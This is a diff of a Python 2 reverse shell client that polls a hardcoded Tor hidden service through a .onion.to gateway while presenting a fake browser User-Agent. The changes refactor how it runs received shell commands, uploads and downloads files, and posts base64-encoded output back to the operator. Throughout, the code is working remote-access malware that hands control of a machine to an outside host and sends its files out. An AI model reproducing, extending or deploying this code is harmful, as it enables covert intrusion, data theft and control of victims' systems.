@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-#   Author = j0lly@anche.no
+#   Author = j0lly
 #   BSD License
 #
 #   this code is an enanchment of an http encrypted reverse python shell fnd listener rom:
@@ -13,39 +13,11 @@
 #        Xavier Garcia http://www.shellguardians.com
 #
 
-import urllib
-import urllib2
-import httplib
-import subprocess
-import sys
-import base64
-import os
-import binascii
-import tempfile
-
-## the block size for the cipher object; must be 16, 24, or 32 for AES
-#BLOCK_SIZE = 32
-## the character used for padding--with a block cipher such as AES, the value
-## you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
-## used to ensure that your value is always a multiple of BLOCK_SIZE
-#PADDING = '{'
-## one-liner to sufficiently pad the text to be encrypted
-#pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
-#
-## one-liners to encrypt/encode and decrypt/decode a string
-## encrypt with AES, encode with base64
-#EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
-#DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
-#
-## secret key, change this if you want to be unique
-#secret = "Fj39@vF4@54&8dE@!)(*^+-pL;'dK3J2"
-#
-## create a cipher object using the random secret
-#cipher = AES.new(secret)
+import urllib, urllib2, httplib, subprocess, sys, base64, os, binascii, tempfile
 
 # set our basic headers
 headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)","Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
-# YOUR TOR SERVER
+# your tor server + .to
 server = "gx32knlxeynsijug.onion.to"
 
 def send_file(doc):
@@ -66,6 +38,27 @@ def write_file(doc):
                 return binascii.hexlify(tmpPayload)
         else: return ""
 
+def manage_request(msg) :
+	# quit out if we receive that command
+	if msg == "quit" or msg == "exit":
+                sys.exit()
+        # send file to server if command == download
+        elif msg[0:8] == "download" :
+            print "Download %s" % msg[9:]
+            data = send_file(msg[9:len(msg)])
+            prefix = "dwl"
+        # receive file from server if command == upload
+        elif msg[0:6] == "upload" :
+            data = write_file(msg[7:len(msg)])
+            prefix = "upl"
+        # else, run the shell comamnd
+        else :
+	    proc = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+	    # read out the data of stdout
+	    data = proc.stdout.read() + proc.stderr.read()
+            prefix = "cmd"
+        return prefix, data
+
 # loop forever
 while 1:
 
@@ -75,35 +68,12 @@ while 1:
 	message = urllib2.urlopen(req)
 	# base64 unencode
 	message = base64.b64decode(message.read())
-#	# decrypt the communications
-#	message = DecodeAES(cipher, message)
-	# quit out if we receive that command
-	if message == "quit" or message == "exit":
-                sys.exit()
-        elif message[0:8] == "download" :
-            print "Download %s" % message[9:]
-            data = send_file(message[9:len(message)])
-	    # base64 encode the data
-	    data = base64.b64encode(data)
-	    # urlencode the data from stdout
-	    data = urllib.urlencode({'dwl': '%s'}) % (data)
-        elif message[0:6] == "upload" :
-            data = write_file(message[7:len(message)])
-	    # base64 encode the data
-	    data = base64.b64encode(data)
-	    # urlencode the data from stdout
-	    data = urllib.urlencode({'upl': '%s'}) % (data)
-        else :
-	    # issue the shell command we want
-	    proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-	    # read out the data of stdout
-	    data = proc.stdout.read() + proc.stderr.read()
-	    # base64 encode the data
-	    data = base64.b64encode(data)
-	    # urlencode the data from stdout
-	    data = urllib.urlencode({'cmd': '%s'}) % (data)
-#	# encrypt the data
-#	data = EncodeAES(cipher, data)
+        # manage request
+        prefix, data = manage_request(message)
+	# base64 encode the data
+	data = base64.b64encode(data)
+	# urlencode the data from stdout
+	data = urllib.urlencode({ prefix : '%s'}) % ( data)
 	# who we want to connect back to with the shell
 	h = httplib.HTTPSConnection(server)
 	# actually post the data
